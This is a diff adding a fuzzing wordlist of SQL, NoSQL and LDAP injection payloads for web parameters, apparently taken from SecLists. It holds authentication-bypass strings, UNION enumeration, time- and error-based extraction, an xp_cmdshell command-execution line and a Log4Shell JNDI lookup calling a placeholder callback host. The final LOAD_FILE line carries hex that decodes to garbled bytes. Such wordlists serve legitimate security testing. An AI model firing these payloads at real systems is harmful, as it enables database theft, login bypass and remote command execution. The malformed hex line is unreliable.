@@ -1,0 +1,60 @@
+# SQLi / NoSQLi / LDAPi fuzz tokens.
+# provenance: SECLISTS@master@2026-01-14 (Discovery/Web-Content/SQL-Injection)
+# crosswalk:  10-crosswalk/wordlist-payload/crosswalk.csv
+# surface:    parameter   cwe: CWE-89
+'
+''
+'#
+'-- -
+' OR '1'='1
+' OR '1'='1'-- -
+' OR '1'='1'#
+' OR 1=1-- -
+' OR 1=1#
+' OR ""='
+' OR ''='
+' OR 1=1 LIMIT 1-- -
+' OR 1=1 LIMIT 1#
+admin'-- -
+admin'#
+') OR ('1'='1
+')) OR (('1'='1
+\" OR \"1\"=\"1
+1 OR 1=1
+1' OR '1'='1
+1' OR '1'='1'-- -
+1 AND 1=1
+1 AND 1=2
+' ORDER BY 1-- -
+' ORDER BY 10-- -
+' UNION SELECT NULL-- -
+' UNION SELECT NULL,NULL-- -
+' UNION SELECT NULL,NULL,NULL-- -
+' UNION SELECT NULL,NULL,NULL,NULL-- -
+' UNION ALL SELECT NULL,NULL,NULL,NULL-- -
+' UNION SELECT user(),version()-- -
+' AND 1=1-- -
+' AND 1=2-- -
+' AND SLEEP(5)-- -
+' AND pg_sleep(5)-- -
+' AND benchmark(5000000,MD5(1))-- -
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
+' AND extractvalue(1,concat(0x7e,version()))-- -
+' AND 1=CONVERT(int,(SELECT @@version))-- -
+' AND updatexml(1,concat(0x7e,version()),1)-- -
+'; WAITFOR DELAY '0:0:5'-- -
+'; SELECT 1-- -
+'; EXEC xp_cmdshell('whoami')-- -
+' AND 1=CAST((SELECT version()) AS int)-- -
+%27
+%27%20OR%201%3D1--
+\";SELECT 1--
+{ "$ne": null }
+{"$ne": null}
+{ "username": { "$ne": null }, "password": { "$ne": null } }
+{ "username": "admin", "password": { "$gt": "" } }
+admin)(|(password=*
+*)(objectClass=*
+*)(uid=*))(|(uid=*
+${jndi:ldap://COLLAB/a}
+' UNION SELECT LOAD_FILE(0x5c5c5c5c5c43f414e545348454c4c43f5c746578742e747874)-- -
